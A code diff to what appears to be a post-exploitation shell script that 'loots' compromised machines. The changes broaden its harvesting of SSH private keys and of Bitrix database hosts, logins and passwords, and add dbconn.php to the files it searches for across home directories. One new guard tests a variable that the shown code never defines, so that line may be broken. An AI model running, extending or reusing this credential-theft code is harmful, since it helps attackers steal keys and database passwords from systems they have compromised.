@@ -728,9 +728,9 @@ bin() {
 
 loot_sshkey() {
     local str
-    local fn="${1:?}"
+    local fn="${1}"
 
-    [ ! -s "${fn}" ] && return
+    { [ -z "$s" ] || [ ! -s "${fn}" ]; } && return
     grep -Fqam1 'PRIVATE KEY' "${fn}" || return
 
     [ -n "$_HS_SETSID_WAIT" ] && {
@@ -747,7 +747,9 @@ loot_bitrix() {
     [ ! -f "$fn" ] && return
     grep -Fqam1 '$_ENV[' "$fn" && return
     echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
-    grep --color=never -E "(host|database|login|password)'.*=" "${fn}" | sed 's/\s*//g'
+    # 'password' => 'abcd',
+    # $DBPassword = 'abcd';
+    grep -i --color=never -E "(host|database|login|Password).*=.* '" "${fn}" | sed 's/\s*//g'
     echo -en "${CN}"
 }
 
@@ -1194,7 +1196,7 @@ loot() {
     #     done
     # done
 
-    find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
+    find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" -o -wholename "*/bitrix/php_interface/dbconn.php" 2>/dev/null | while read -r fn; do
         loot_bitrix "$fn"
     done
 
